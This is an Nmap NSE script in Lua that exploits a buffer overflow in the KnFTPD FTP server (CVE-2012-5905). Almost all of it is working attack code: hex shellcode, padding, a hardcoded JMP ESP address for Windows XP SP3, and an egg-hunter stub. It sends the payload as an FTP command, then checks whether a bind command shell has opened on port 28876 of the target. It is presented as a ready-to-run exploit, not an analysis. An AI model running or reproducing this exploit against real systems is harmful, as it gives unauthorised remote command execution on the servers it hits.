description = [[
Explore the (CVE-2012-5905) buffer overflow in the KnFTPD service, however it is going to execute a remote code and get a Command Shell.

Refference:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5905
http://blog.conviso.com.br/2012/12/cve-2012-5905-de-negacao-de-servico.html
]]

---
-- @usage
-- nmap -p21 -sV --script=knftpd-exploit <host>
--
-- @output
-- PORT   STATE SERVICE VERSION
-- 21/tcp open  ftp     ProFTPD or KnFTPD
-- | knftpd-exploit: 
-- |_  STATUS: Command shell has been opened. (<host>:28876)

author = "Leandro Rocha"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"exploit", "intrusive", "vuln"}

local stdnse = require "stdnse"
local shortport = require "shortport"
local nmap = require "nmap"
local bin = require "bin"

portrule = shortport.service("ftp")

action = function( host, port )

  local shellcode =
        "31c9648b71308b760c8b761c8b6e088b7e208b36384f1875f35168325f333268"..
        "6656777368b78f099889e6b50329cc29cc89e7d6f3aa41514151575183ef2ca4"..
        "4f8b5d3c8b5c1d7801eb8b4b2001e95631d2428b349101eeb436ac347128c43c"..
        "7175f73a2775eb5e8b4b2401e90fb714518b4b1c01e989e8030491ab803e0975"..
        "088d5e0453ffd05795803e7375b15eadffd0adffd095812ffeff8f336a1057ad"..
        "55ffd085c074f831d25268636d64208d7c2438abababc647e90154873c245752"..
        "5252c647ef085752525752ff56e48b46fce9caffffff"

  local payload = stdnse.tohex("w00tw00t")
  local payload = payload .. stdnse.tohex(("@"):rep((268 - (bin.pack("H", shellcode):len() - bin.pack("H", payload):len()))))
  local payload = payload .. shellcode
  local payload = payload .. stdnse.tohex(bin.pack("<I", 0x7C86467B)) -- JMP ESP WinXP SP3 pt-BR
  local payload = payload .. stdnse.tohex("4FUN")

  -- find w00t (egg hunter)
  local payload = payload ..
                  "6681caff0f"..    -- OR      DX, 0FFF
                  "42"..            -- INC     EDX
                  "52"..            -- PUSH    EDX
                  "6a02"..          -- PUSH    2
                  "58"..            -- POP     EAX
                  "cd2e"..          -- INT     2E
                  "3c05"..          -- CMP     AL, 5
                  "5a"..            -- POP     EDX
                  "74ef"..          -- JE      SHORT 00B5FFC0
                  "b877303074"..    -- MOV     EAX, 74303077
                  "8bfa"..          -- MOV     EDI, EDX
                  "af"..            -- SCAS    DWORD PTR ES:[EDI]
                  "75ea"..          -- JNZ     SHORT 00B5FFC5
                  "af"..            -- SCAS    DWORD PTR ES:[EDI]
                  "75e7"..          -- JNZ     SHORT 00B5FFC5
                  "ffe7"            -- JMP     EDI

  local s1 = nmap.new_socket('tcp')
  local status, err = s1:connect(host, port)
  if(not(status)) then
      return err
  end
 
  if string.find(port.version.product, "KnFTPD") then
      local exploit = ("%s %s\r\n"):format(stdnse.generate_random_string(7), bin.pack("H", payload)) -- FTP CMD random string with 7 characters
      local status, err = s1:send(exploit)
      if(not(status)) then
          return err
      end
      
      s1:close()
      
      -- Checking if exploited has been executed successfully.
      wait = 1
      local s2 = nmap.new_socket('tcp')
      while wait ~= 10 do
          local exploit_status, exploit_err = s2:connect(host, 28876)
          if(not(exploit_status)) then
              stdnse.sleep(1)
          else
              break
          end
          wait = ( wait + 1 )
      end
      
      if wait == 10 then
          return "Command shell hasn't been opened!"
      end

      -- Successfully exploited.
      local output_tab = stdnse.output_table()
      output_tab.STATUS = ("Command shell has been opened. (%s:28876)"):format(host.ip)
      return output_tab
  end
  return
end
